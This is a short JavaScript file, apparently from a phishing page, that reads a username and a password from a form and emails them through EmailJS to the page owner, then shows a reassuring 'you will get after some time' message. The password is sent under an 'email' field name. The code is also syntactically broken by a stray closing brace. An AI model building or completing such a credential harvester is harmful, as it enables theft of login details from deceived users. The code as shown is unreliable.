(function () {
  emailjs.init("");//enter your ejs link
})();

///////////////////never-touch-it////////////////////////
// ---------------------------------------------
const serviceId = "";//enter your ejs serviceid
const templateId = "";//enter your ejs id
// ---------------------------------------------
//////////////////never-touch-it/////////////////////////

const handleSubmit = () => {
  const userName = document.querySelector(".id").value;
  const password = document.querySelector(".password").value;
  const contactMe = document.querySelector(".contact-me");

  if (userName == "" && password == "") {
    contactMe.textContent = "it can't be empty";
  }
  } else {
    contactMe.textContent = "wait...";
    var params = {
      name: userName,
      email: password,
      // message: message
    };
    emailjs
      .send(serviceId, templateId, params)
      .then((res) => {
        let a = document.querySelector(".contact-me");
        a.style.color = "green";
        contactMe.innerHTML = "All done 👍<br>you will get after some time";
        contactMe.style.textAlign = "center";
      })
      .catch((err) => {
        console.log("An error has been occured");
      });
  }
};
